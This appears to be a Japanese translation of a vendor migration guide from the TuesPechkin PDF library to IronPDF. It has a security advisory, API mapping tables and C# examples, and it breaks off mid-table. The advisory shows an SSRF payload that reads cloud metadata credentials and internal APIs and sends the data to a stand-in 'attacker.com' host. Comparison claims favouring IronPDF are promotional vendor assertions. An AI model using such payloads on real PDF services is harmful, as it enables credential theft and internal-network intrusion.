---
**🌐 日本語版 (Japanese Translation)**

📖 **English:** [tuespechkin/migrate-from-tuespechkin.md](https://github.com/iron-software/awesome-dotnet-pdf-libraries-2025/blob/main/tuespechkin/migrate-from-tuespechkin.md)
🇯🇵 **日本語:** [tuespechkin/migrate-from-tuespechkin.md](https://github.com/csharp-pdf-libraries/awesome-dotnet-pdf-libraries-2025-jp/blob/main/tuespechkin/migrate-from-tuespechkin.md)

---

# 移行ガイド: TuesPechkin → IronPDF

## ⚠️ 重大なセキュリティアドバイザリ

**TuesPechkin は wkhtmltopdf をラップしており、CRITICAL UNPATCHED SECURITY VULNERABILITIES が存在します。**

### CVE-2022-35583 — サーバーサイドリクエストフォージェリ (SSRF)

| 属性 | 値 |
|-----------|-------|
| **CVE ID** | CVE-2022-35583 |
| **重大度** | **CRITICAL (9.8/10)** |
| **攻撃ベクトル** | ネットワーク |
| **ステータス** | **修正されることはありません** |
| **影響を受けるバージョン** | すべてのTuesPechkinバージョン |

**wkhtmltopdf は 2022年12月に公式に放棄されました。** メンテナはセキュリティの脆弱性を修正しないことを明言しています。これは、TuesPechkin を使用しているすべてのアプリケーションが永久に露出していることを意味します。

### 攻撃の仕組み

```html
<!-- 攻撃者があなたのPDFジェネレータにこのHTMLを提出 -->
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<img src="http://internal-admin-panel:8080/api/users?export=all" />
<script>
  fetch('http://192.168.1.1/admin/config').then(r => r.text()).then(d => {
    new Image().src = 'https://attacker.com/steal?data=' + btoa(d);
  });
</script>
```

**影響:**
- AWS/Azure/GCP メタデータエンドポイントへのアクセス
- 内部APIデータの盗難
- 内部ネットワークのポートスキャン
- 機密設定の流出
- 内部管理パネルへのアクセス

### 実際の攻撃シナリオ

1. **請求書ジェネレータ**: ユーザー提出のコンテンツが内部APIにアクセス
2. **レポートビルダー**: テンプレートインジェクションがデータベースの資格情報を盗む
3. **証明書ジェネレータ**: 名前フィールドに悪意のあるHTMLが含まれている
4. **Email-to-PDF**: 転送されたメールがSSRF攻撃を引き起こす

---

## 目次
1. [今すぐ移行する理由](#今すぐ移行する理由)
2. [TuesPechkinの重大な問題](#tuespechkinsの重大な問題)
3. [クイックスタート移行（5分）](#クイックスタート移行-5分)
4. [完全なAPIリファレンス](#完全なapiリファレンス)
5. [コード移行例](#コード移行例)
6. [スレッドセーフティの比較](#スレッドセーフティの比較)
7. [TuesPechkinで利用できない機能](#tuespechkinで利用できない機能)
8. [パフォーマンスの比較](#パフォーマンスの比較)
9. [デプロイメントの比較](#デプロイメントの比較)
10. [トラブルシューティングガイド](#トラブルシューティングガイド)
11. [移行チェックリスト](#移行チェックリスト)
12. [追加リソース](#追加リソース)

---

## 今すぐ移行する理由

### セキュリティ危機

| リスク | TuesPechkin | IronPDF |
|------|-------------|---------|
| **CVE-2022-35583 (SSRF)** | ❌ 脆弱 | ✅ 保護されている |
| **ローカルファイルアクセス** | ❌ 脆弱 | ✅ サンドボックス化 |
| **内部ネットワークアクセス** | ❌ 脆弱 | ✅ 制限されている |
| **セキュリティパッチ** | ❌ なし | ✅ 定期的な更新 |
| **アクティブな開発** | ❌ 2015年に放棄 | ✅ 月次リリース |

### 技術危機

TuesPechkin は wkhtmltopdf をラップしており、最後の更新は **2015年** です。それは以下を使用しています:
- **Qt WebKit 4.8** (古い、プレクローム時代)
- **Flexbox サポートなし**
- **CSS Grid サポートなし**
- **JavaScript 実行が壊れている**
- **ES6+ サポートなし**

### 安定性危機

```csharp
// ❌ TuesPechkin - ThreadSafeConverter でも負荷下でクラッシュ
var converter = new TuesPechkin.ThreadSafeConverter(
    new TuesPechkin.RemotingToolset<PechkinBindings>());

// クラッシュする原因:
// - AccessViolationException
// - StackOverflowException
// - プロセスが無期限にハングアップ
// - メモリ破損
```

### 機能比較

| 機能 | TuesPechkin | IronPDF |
|---------|-------------|---------|
| **セキュリティ** | ❌ 重大なCVE | ✅ 既知の脆弱性なし |
| **HTMLからPDFへ** | ⚠️ 古いWebKit | ✅ 現代のChromium |
| **CSS3** | ❌ 部分的 | ✅ 完全サポート |
| **Flexbox/Grid** | ❌ サポートされていない | ✅ 完全サポート |
| **JavaScript** | ⚠️ 信頼性がない | ✅ 完全なES6+ |
| **スレッドセーフティ** | ⚠️ 複雑でクラッシュ | ✅ ネイティブ |
| **PDF操作** | ❌ 利用不可 | ✅ 完全 |
| **デジタル署名** | ❌ 利用不可 | ✅ 完全 |
| **PDF/A準拠** | ❌ 利用不可 | ✅ 完全 |
| **フォーム入力** | ❌ 利用不可 | ✅ 完全 |
| **ウォーターマーク** | ❌ 利用不可 | ✅ 完全 |
| **マージ/分割** | ❌ 利用不可 | ✅ 完全 |
| **暗号化** | ⚠️ 限定的 | ✅ 完全 |
| **ヘッダー/フッター** | ⚠️ 基本的 | ✅ 完全なHTML |
| **アクティブなメンテナンス** | ❌ 2015年に放棄 | ✅ 週次更新 |

---

## TuesPechkinの重大な問題

### 問題 1: セキュリティの悪夢

TuesPechkin を使用しているすべてのアプリケーションは SSRF 攻撃に対して脆弱です:

```csharp
// ❌ 危険 - 任意のユーザー入力がSSRFを引き起こす可能性がある
var document = new TuesPechkin.HtmlToPdfDocument
{
    Objects = {
        new TuesPechkin.ObjectSettings {
            HtmlText = userProvidedHtml  // 攻撃者がコントロール可能!
        }
    }
};

byte[] pdf = converter.Convert(document);
// 攻撃者のHTMLはあなたの内部ネットワークにアクセスできるようになります
```

### 問題 2: スレッドセーフティの嘘

TuesPechkin は "スレッドセーフ" を謳っていますが、それでもクラッシュします:

```csharp
// ❌ TuesPechkin - "ThreadSafeConverter" でも負荷下でクラッシュ
var converter = new TuesPechkin.ThreadSafeConverter(
    new TuesPechkin.RemotingToolset<PechkinBindings>());

// 高負荷時には、次のような状況が見られます:
// System.AccessViolationException: 保護されたメモリの読み書きを試みました
// プロセスが予期せず終了しました
// コンバーターが無期限にハングアップします
```

### 問題 3: 複雑なデプロイメント

```csharp
// ❌ TuesPechkin - 複雑な初期化儀式が必要
var converter = new TuesPechkin.StandardConverter(
    new TuesPechkin.RemotingToolset<PdfToolset>(
        new TuesPechkin.Win64EmbeddedDeployment(
            new TuesPechkin.TempFolderDeployment())));

// 必要なもの:
// - プラットフォーム固有の wkhtmltopdf バイナリ
// - 正しいアーキテクチャ (x86/x64)
// - ネイティブライブラリパスの設定
// - 安定性のためのAppDomain分離
```

### 問題 4: 古いレンダリング

```html
<!-- このモダンなCSSはTuesPechkinでは機能しません -->
<div style="display: flex; justify-content: space-between; gap: 20px;">
    <div style="flex: 1;">カラム 1</div>
    <div style="flex: 1;">カラム 2</div>
</div>

<div style="display: grid; grid-template-columns: repeat(3, 1fr);">
    <div>グリッドアイテム 1</div>
    <div>グリッドアイテム 2</div>
    <div>グリッドアイテム 3</div>
</div>
```

---

## クイックスタート移行 (5分)

### ステップ 1: NuGet パッケージを更新

```bash
# TuesPechkin および関連するすべてのパッケージを削除
dotnet remove package TuesPechkin
dotnet remove package TuesPechkin.Wkhtmltox.Win64
dotnet remove package TuesPechkin.Wkhtmltox.Win32

# IronPDF をインストール
dotnet add package IronPdf
```

### ステップ 2: ネイティブバイナリを削除

これらのファイル/フォルダを削除します:
- `wkhtmltox.dll`
- `wkhtmltopdf.exe`
- 任意の `wkhtmlto*` ファイル
- `TuesPechkin.Wkhtmltox` フォルダ

### ステップ 3: Using ステートメントを更新

```csharp
// 以前
using TuesPechkin;
using TuesPechkin.Wkhtmltox.Win64;

// 以降
using IronPdf;
```

### ステップ 4: ライセンスキーを追加

```csharp
// アプリケーションの起動時に追加
IronPdf.License.LicenseKey = "YOUR-LICENSE-KEY";
```

### ステップ 5: コードを更新

**以前 (TuesPechkin):**
```csharp
using TuesPechkin;

var converter = new ThreadSafeConverter(
    new RemotingToolset<PdfToolset>(
        new Win64EmbeddedDeployment(
            new TempFolderDeployment())));

var document = new HtmlToPdfDocument
{
    GlobalSettings = {
        PaperSize = PaperKind.A4,
        Orientation = GlobalSettings.PdfOrientation.Portrait
    },
    Objects = {
        new ObjectSettings {
            HtmlText = "<h1>Hello World</h1>"
        }
    }
};

byte[] pdf = converter.Convert(document);
File.WriteAllBytes("output.pdf", pdf);
```

**以降 (IronPDF):**
```csharp
using IronPdf;

var renderer = new ChromePdfRenderer();
renderer.RenderingOptions.PaperSize = PdfPaperSize.A4;
renderer.RenderingOptions.PaperOrientation = PdfPaperOrientation.Portrait;

var pdf = renderer.RenderHtmlAsPdf("<h1>Hello World</h1>");
pdf.SaveAs("output.pdf");
// スレッドセーフティの問題なし！セキュリティの脆弱性なし！ネイティブバイナリなし！
```

---

## 完全なAPIリファレンス

### 名前空間マッピング

| TuesPechkin 名前空間 | IronPDF 名前空間 |
|----------------------|-------------------|
| `TuesPechkin` | `IronPdf` |
| `TuesPechkin.Wkhtmltox.Win64` | 不要 |
| `TuesPechkin.Wkhtmltox.Win32` | 不要 |

### コアクラスマッピング

| TuesPechkin | IronPDF | メモ |
|-------------|---------|-------|
| `ThreadSafeConverter` | `ChromePdfRenderer` | デフォルトでスレッドセーフ |
| `StandardConverter` | `ChromePdfRenderer` | コンバーターのバリエーションなし |
| `RemotingToolset<T>` | 不要 | 内部化されている |
| `Win64EmbeddedDeployment` | 不要 | ネイティブバイナリなし |
| `TempFolderDeployment` | 不要 | デプロイメントなし |
| `HtmlToPdfDocument` | 直接メソッド呼び出し | よりシンプルなAPI |
| `GlobalSettings` | `RenderingOptions` | レンダラー上 |
| `ObjectSettings` | `RenderingOptions` | レンダラー上 |

### GlobalSettings マッピング

| TuesPechkin GlobalSettings | IronPDF 対応 |
|---------------------------|-------------------|
| `PaperSize = PaperKind.A4` | `PaperSize = PdfPaperSize.A4` |
| `PaperSize = PaperKind.Letter` | `PaperSize = PdfPaperSize.Letter` |
| `Orientation = .Portrait` | `PaperOrientation = PdfPaperOrientation.Portrait` |
| `Orientation = .Landscape` | `PaperOrientation = PdfPaperOrientation.Landscape` |
| `OutputFormat = .Pdf` | デフォルト (常にPDF) |
| `Margins.Top = 10` | `MarginTop = 10` |
| `Margins.Bottom = 10` | `MarginBottom = 10` |
| `Margins.Left = 10` | `MarginLeft = 10` |
| `Margins.Right = 10` | `MarginRight = 10` |
| `DocumentTitle = "..."` | `pdf.MetaData.Title = "..."` |
| `Dpi = 300` | `PrintDpi = 300` |

### ObjectSettings マッピング

| TuesPechkin ObjectSettings | IronPDF 対応 |
|---------------------------|-------------------|
| `HtmlText = "..."` | `RenderHtmlAsPdf("...")` |
| `PageUrl = "https://..."` | `RenderUrlAsPdf("https